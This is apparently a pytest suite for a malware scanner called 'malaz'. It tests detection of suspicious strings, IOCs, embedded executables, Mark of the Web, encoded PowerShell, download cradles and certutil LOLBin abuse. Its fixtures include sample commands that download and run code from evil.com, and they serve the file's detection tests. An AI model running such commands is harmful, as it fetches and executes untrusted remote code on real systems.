import base64
import os
from pathlib import Path

import pytest

from malaz.core.script_deobf import decode_powershell_encoded
from malaz.models import AnalysisContext
from malaz.pipelines.generic_pipeline import GenericPipeline


def _ctx(data: bytes, name="f.txt", ftype="text"):
    return AnalysisContext(path=Path(name), data=data, detected_type=ftype, size=len(data))


def _ids(indicators):
    return [i.rule_id for i in indicators]


def test_suspicious_strings_high_with_multiple_tokens():
    data = b"powershell -encodedcommand SQBFAFgA downloadstring"
    inds = GenericPipeline().analyze(_ctx(data))
    hit = [i for i in inds if i.rule_id == "GEN_SUSPICIOUS_STRINGS"]
    assert hit and hit[0].severity.name == "HIGH"


def test_no_suspicious_strings_in_benign_text():
    inds = GenericPipeline().analyze(_ctx(b"hello world, just a normal note"))
    assert "GEN_SUSPICIOUS_STRINGS" not in _ids(inds)


def test_ioc_extraction():
    data = b"see http://evil.example.com/x.exe and 192.0.2.55 plus bad.xyz"
    inds = GenericPipeline().analyze(_ctx(data))
    ioc = [i for i in inds if i.rule_id == "GEN_IOC"]
    assert ioc
    detail = ioc[0].detail
    assert "192.0.2.55" in detail
    assert "bad.xyz" in detail


def test_unknown_high_entropy_bytes_use_binary_ioc_path():
    data = b"http://malicious.invalid/a" + bytes(range(256)) * 4
    inds = GenericPipeline().analyze(_ctx(data, ftype="unknown"))
    assert "BINARY_IOC" in _ids(inds)


def test_benign_domains_filtered():
    data = b"docs at https://www.w3.org/TR/ and schemas.openxmlformats.org"
    inds = GenericPipeline().analyze(_ctx(data))
    # w3.org / openxmlformats are benign -> no IOC indicator
    assert "GEN_IOC" not in _ids(inds)


def test_lnk_with_arguments_flagged():
    import struct

    magic = b"\x4c\x00\x00\x00"
    clsid = b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
    flags = (1 << 5) | (1 << 7)
    hdr = magic + clsid + struct.pack("<I", flags) + b"\x00" * (76 - 24)
    arg = "powershell -enc X"
    body = struct.pack("<H", len(arg)) + arg.encode("utf-16-le")
    inds = GenericPipeline().analyze(_ctx(hdr + body, name="x.lnk", ftype="lnk"))
    ids = _ids(inds)
    assert "LNK_ARGUMENTS" in ids
    # shell in arguments -> HIGH
    assert any(i.rule_id == "LNK_ARGUMENTS" and i.severity.name == "HIGH" for i in inds)


# -- filename IOCs ---------------------------------------------------------- #


def test_filename_ioc_hit_is_anchor(tmp_path, monkeypatch):
    from malaz import config

    rules_dir = tmp_path / "iocs"
    rules_dir.mkdir()
    (rules_dir / "test.txt").write_text(
        r"\.(pdf|docx?)\.(exe|scr)$;50;Test-Regel" + "\n"
    )
    monkeypatch.setattr(config, "FILENAME_IOC_RULES_DIR", rules_dir)
    inds = GenericPipeline().analyze(
        _ctx(b"x", name="rechnung.pdf.exe", ftype="unknown")
    )
    hits = [i for i in inds if i.rule_id == "GEN_FILENAME_IOC"]
    assert hits
    assert hits[0].severity.name == "CRITICAL"
    assert hits[0].weight == 50
    assert "Test-Regel" in hits[0].detail


def test_filename_ioc_bom_does_not_disable_the_first_rule(tmp_path, monkeypatch):
    """BUG-080: a UTF-8 BOM on rule line 1 made that regex invalid/unmatched."""
    from malaz import config

    rules_dir = tmp_path / "iocs"
    rules_dir.mkdir()
    (rules_dir / "test.txt").write_bytes(
        b"\xef\xbb\xbf" + rb"\.(exe|scr)$;50;Erste-Regel" + b"\n"
    )
    monkeypatch.setattr(config, "FILENAME_IOC_RULES_DIR", rules_dir)
    inds = GenericPipeline().analyze(
        _ctx(b"x", name="rechnung.exe", ftype="unknown")
    )
    hits = [i for i in inds if i.rule_id == "GEN_FILENAME_IOC"]
    assert hits, "die erste Regel mit BOM wurde nicht geladen"
    assert "Erste-Regel" in hits[0].detail


def test_filename_ioc_no_hit(tmp_path, monkeypatch):
    from malaz import config

    rules_dir = tmp_path / "iocs"
    rules_dir.mkdir()
    (rules_dir / "test.txt").write_text(r"\.(exe|scr)$;50" + "\n")
    monkeypatch.setattr(config, "FILENAME_IOC_RULES_DIR", rules_dir)
    inds = GenericPipeline().analyze(_ctx(b"x", name="note.pdf", ftype="pdf"))
    assert "GEN_FILENAME_IOC" not in _ids(inds)


def test_filename_ioc_invalid_regex_skipped(tmp_path, monkeypatch):
    from malaz import config
    from malaz.core.filename_iocs import load_errors

    rules_dir = tmp_path / "iocs"
    rules_dir.mkdir()
    (rules_dir / "bad.txt").write_text("([unclosed" + "\n")
    monkeypatch.setattr(config, "FILENAME_IOC_RULES_DIR", rules_dir)
    errors = load_errors()
    assert errors and "ungültiger Regex" in errors[0]
    inds = GenericPipeline().analyze(_ctx(b"x", name="a.exe", ftype="pe"))
    assert "GEN_FILENAME_IOC" not in _ids(inds)


# -- embedded signature scan ------------------------------------------------ #


def test_embedded_pe_after_png_trailer():
    # A valid PNG header + junk + a structurally valid PE stub appended.
    png_head = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
    import struct

    pe_stub = (
        b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x80)
        + b"\x00" * 0x40 + b"PE\x00\x00"  # PE header exactly at MZ + e_lfanew
    )
    data = png_head + b"\x00" * 32 + pe_stub
    inds = GenericPipeline().analyze(_ctx(data, name="img.png", ftype="png"))
    hits = [i for i in inds if i.rule_id == "GEN_EMBEDDED"]
    # Der Offset steht jetzt im Detail (der Titel nennt Typ und Anzahl), weil
    # mehrere Vorkommen desselben Typs zu EINEM Befund zusammengefasst werden.
    assert any(
        "pe" in h.title and "Offset" in h.detail for h in hits
    ), [h.title for h in hits]


def test_embedded_requires_valid_pe_not_bare_mz():
    # Bare "MZ" without a PE header must NOT count as an embedded PE.
    data = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64 + b"MZ" + b"\x90" * 200
    inds = GenericPipeline().analyze(_ctx(data, name="img.png", ftype="png"))
    hits = [i for i in inds if i.rule_id == "GEN_EMBEDDED" and "pe" in i.title]
    assert not hits


def test_embedded_gzip_requires_plausible_header():
    # Random 1f 8b bytes must not fire; a real deflate header does.
    import gzip

    junk = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32 + b"\x1f\x8b\x99\xffgarbage"
    inds = GenericPipeline().analyze(_ctx(junk, name="a.bin", ftype="unknown"))
    assert not any("gzip" in i.title for i in inds if i.rule_id == "GEN_EMBEDDED")

    real = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32 + gzip.compress(b"payload")
    inds = GenericPipeline().analyze(_ctx(real, name="a.bin", ftype="unknown"))
    assert any("gzip" in i.title for i in inds if i.rule_id == "GEN_EMBEDDED")


def test_embedded_skipped_for_archives_and_text():
    import gzip

    data = gzip.compress(b"inside")
    assert "GEN_EMBEDDED" not in _ids(
        GenericPipeline().analyze(_ctx(data, name="a.gz", ftype="gzip"))
    )
    assert "GEN_EMBEDDED" not in _ids(
        GenericPipeline().analyze(
            _ctx(b"PK\x03\x04 inside text", name="a.txt", ftype="text")
        )
    )


# -- Mark of the Web (Windows only) ---------------------------------------- #


@pytest.mark.skipif(os.name != "nt", reason="Windows ADS only")
def test_motw_detected(tmp_path):
    target = tmp_path / "downloaded.pdf"
    target.write_bytes(b"%PDF-1.7\n%%EOF")
    try:
        ads = Path(f"{target}:Zone.Identifier")
        ads.write_text(
            "[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=http://evil.example/x\r\n",
            encoding="utf-8",
        )
    except OSError:
        pytest.skip("ADS nicht unterstützt (Dateisystem)")
    inds = GenericPipeline().analyze(
        AnalysisContext(
            path=target, data=b"%PDF-1.7\n%%EOF", detected_type="pdf",
            size=target.stat().st_size, depth=0,
        )
    )
    motw = [i for i in inds if i.rule_id == "GEN_MOTW"]
    assert motw
    assert "Internet" in motw[0].detail
    assert "evil.example" in motw[0].detail


@pytest.mark.skipif(os.name != "nt", reason="Windows ADS only")
def test_motw_absent_when_no_ads(tmp_path):
    target = tmp_path / "local.pdf"
    target.write_bytes(b"%PDF-1.7\n%%EOF")
    inds = GenericPipeline().analyze(
        AnalysisContext(
            path=target, data=b"%PDF-1.7\n%%EOF", detected_type="pdf",
            size=target.stat().st_size, depth=0,
        )
    )
    assert "GEN_MOTW" not in _ids(inds)


# -- bounded content scan (performance regression) -------------------------- #


def test_content_scan_capped_at_sample_size(monkeypatch):
    from malaz import config

    # IOC inside the sample -> found.
    monkeypatch.setattr(config, "MAX_CONTENT_SCAN_SIZE", 256)
    monkeypatch.setattr(config, "MAX_CONTENT_TAIL_SIZE", 0)
    data = b"A" * 100 + b"http://evil.example/x" + b"B" * 100
    inds = GenericPipeline().analyze(_ctx(data, name="a.bin", ftype="unknown"))
    assert any(i.rule_id == "GEN_IOC" for i in inds)

    # IOC beyond the sample -> NOT found (the cap is the contract: large files
    # must not be scanned in full repeatedly).
    data = b"A" * 10000 + b"http://evil.example/x" + b"B" * 100
    inds = GenericPipeline().analyze(_ctx(data, name="a.bin", ftype="unknown"))
    assert not any(i.rule_id == "GEN_IOC" for i in inds)


def test_content_scan_includes_tail(monkeypatch):
    from malaz import config

    monkeypatch.setattr(config, "MAX_CONTENT_SCAN_SIZE", 256)
    monkeypatch.setattr(config, "MAX_CONTENT_TAIL_SIZE", 64)
    # Appended payload after a large body: IOC in the tail is still found.
    data = b"A" * 10000 + b"http://evil.example/x"
    inds = GenericPipeline().analyze(_ctx(data, name="a.bin", ftype="unknown"))
    assert any(i.rule_id == "GEN_IOC" for i in inds)


def test_hash_blocklist_hit_is_critical(tmp_path, monkeypatch):
    import hashlib

    from malaz import config
    from malaz.core import hashlist

    data = b"blocked sample content"
    digest = hashlib.sha256(data).hexdigest()
    bl = tmp_path / "bl.sha256"
    bl.write_text(digest + "\n")
    monkeypatch.setattr(config, "HASH_BLOCKLIST_FILE", bl)
    hashlist._load_blocklist.cache_clear()
    inds = GenericPipeline().analyze(_ctx(data))
    hit = [i for i in inds if i.rule_id == "GEN_HASH_BLOCKLIST"]
    assert hit and hit[0].severity.name == "CRITICAL"
    hashlist._load_blocklist.cache_clear()


# -- PowerShell / LOLBin deep heuristics ----------------------------------- #


def _enc_ps(command: str) -> str:
    """Base64 of a command encoded as UTF-16LE (PowerShell -EncodedCommand)."""
    return base64.b64encode(command.encode("utf-16-le")).decode("ascii")


def test_decode_powershell_encoded_unit():
    blob = _enc_ps("Invoke-Expression foo")
    decoded = decode_powershell_encoded("powershell -encodedcommand " + blob)
    assert any("Invoke-Expression" in d for d in decoded)


def test_decode_powershell_encoded_ignores_garbage():
    assert decode_powershell_encoded("nothing encoded here") == []


def test_encoded_powershell_decoded_and_hidden_tokens():
    blob = _enc_ps("Invoke-Expression (New-Object Net.WebClient).DownloadString('x')")
    data = ("powershell -nop -encodedcommand " + blob).encode()
    inds = GenericPipeline().analyze(_ctx(data))
    ids = _ids(inds)
    assert "GEN_PS_ENCODED" in ids
    enc = next(i for i in inds if i.rule_id == "GEN_PS_ENCODED")
    # Decoded cleartext contains suspicious tokens -> HIGH.
    assert enc.severity.name == "HIGH"
    assert "invoke-expression" in enc.detail.lower()


def test_powershell_cradle_detected():
    data = b"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/x')"
    inds = GenericPipeline().analyze(_ctx(data))
    assert "GEN_PS_CRADLE" in _ids(inds)


def test_cradle_needs_both_download_and_exec():
    # Download primitive alone is not a cradle.
    data = b"just a Net.WebClient reference without execution"
    inds = GenericPipeline().analyze(_ctx(data))
    assert "GEN_PS_CRADLE" not in _ids(inds)


def test_lolbin_abuse_detected():
    data = b"certutil -urlcache -split -f http://evil.com/x.exe payload.exe"
    inds = GenericPipeline().analyze(_ctx(data))
    ids = _ids(inds)
    assert "GEN_LOLBIN_ABUSE" in ids
    lol = next(i for i in inds if i.rule_id == "GEN_LOLBIN_ABUSE")
    assert "certutil" in lol.detail


def test_benign_text_has_no_ps_indicators():
    inds = GenericPipeline().analyze(_ctx(b"hello world, just a normal note"))
    ids = _ids(inds)
    assert "GEN_PS_ENCODED" not in ids
    assert "GEN_PS_CRADLE" not in ids
    assert "GEN_LOLBIN_ABUSE" not in ids


def test_no_entropy_flag_for_compressed_containers():
    # ZIP/OOXML etc. are always high-entropy by construction; flagging them
    # would be a systematic false positive on every office document.
    import gzip

    data = gzip.compress(b"x" * 1000)
    inds = GenericPipeline().analyze(_ctx(data, name="a.gz", ftype="gzip"))
    assert "GEN_ENTROPY" not in _ids(inds)
    data = b"PK\x03\x04" + b"\x00" * 500
    inds = GenericPipeline().analyze(_ctx(data, name="a.zip", ftype="zip"))
    assert "GEN_ENTROPY" not in _ids(inds)
